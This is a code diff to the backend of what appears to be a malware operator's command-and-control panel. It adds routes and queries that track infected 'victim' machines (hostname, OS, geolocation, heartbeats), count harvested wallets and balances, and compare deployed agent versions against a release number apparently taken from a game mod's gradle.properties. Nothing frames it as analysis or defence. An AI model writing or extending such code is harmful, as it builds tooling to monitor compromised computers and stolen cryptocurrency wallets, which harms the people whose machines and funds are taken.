@@ -17,9 +17,10 @@ const LOG_DIR = process.env.LOG_DIR ?? './logs';
 export const miscRoutes: FastifyPluginAsync = async (app) => {
   app.get('/dashboard', async () => {
     const since = new Date(Date.now() - 90_000);
+    const recent = { OR: [{ lastHeartbeatAt: { gte: since } }, { lastAgentMessageAt: { gte: since } }] };
     const [total, online, wallets, balances, artifacts, queued, byOs, byCountry] = await Promise.all([
       prisma.victim.count(),
-      prisma.victim.count({ where: { lastHeartbeatAt: { gte: since }, revokedAt: null } }),
+      prisma.victim.count({ where: { ...recent, revokedAt: null } }),
       prisma.wallet.count(),
       prisma.wallet.count({ where: { NOT: { balance: null } } }),
       prisma.artifact.count({ where: { status: 'ready' } }),
@@ -37,10 +38,10 @@ export const miscRoutes: FastifyPluginAsync = async (app) => {
   app.get('/map', async () => {
     const rows = await prisma.victim.findMany({
       where: { lat: { not: null }, lon: { not: null } },
-      select: { id: true, hostname: true, os: true, country: true, city: true, lat: true, lon: true, lastHeartbeatAt: true },
+      select: { id: true, hostname: true, os: true, country: true, city: true, lat: true, lon: true, lastHeartbeatAt: true, lastAgentMessageAt: true },
       take: 5000
     });
-    return { points: rows.map((row) => ({ ...row, online: Date.now() - row.lastHeartbeatAt.getTime() < 90_000 })) };
+    return { points: rows.map((row) => ({ ...row, online: Date.now() - Math.max(row.lastHeartbeatAt.getTime(), row.lastAgentMessageAt.getTime()) < 90_000 })) };
   });
 
   app.get('/notifications', async (request) => {
@@ -160,6 +161,31 @@ export const miscRoutes: FastifyPluginAsync = async (app) => {
     if (!/^[\w.-]+\.log$/.test(file)) throw bad('bad_file', 'invalid log name');
     reply.header('content-type', 'text/plain');
     return reply.send(createReadStream(join(LOG_DIR, file)));
+  });
+
+  app.get('/versions', async () => {
+    let release = process.env['SPC_RELEASE_VERSION'] ?? '';
+    if (!release) {
+      for (const candidate of [join(process.cwd(), '..', 'gradle.properties'), join(process.cwd(), 'gradle.properties')]) {
+        const text = await readFile(candidate, 'utf8').catch(() => '');
+        const match = /^mod_version=(.+)$/m.exec(text);
+        if (match) {
+          release = match[1]!.trim();
+          break;
+        }
+      }
+    }
+    const rows = await prisma.victim.findMany({ select: { agentVersion: true }, where: { revokedAt: null }, take: 5000 });
+    const versions = new Map<string, number>();
+    for (const row of rows) versions.set(row.agentVersion || 'unknown', (versions.get(row.agentVersion || 'unknown') ?? 0) + 1);
+    const outdated = release
+      ? rows.filter((row) => row.agentVersion && row.agentVersion !== release).length
+      : 0;
+    return {
+      release: release || null,
+      agents: Array.from(versions, ([version, count]) => ({ version, count })),
+      outdated
+    };
   });
 
   app.get('/health', async () => ({ ok: true, version: 1, uptime: Math.floor(process.uptime()) }));
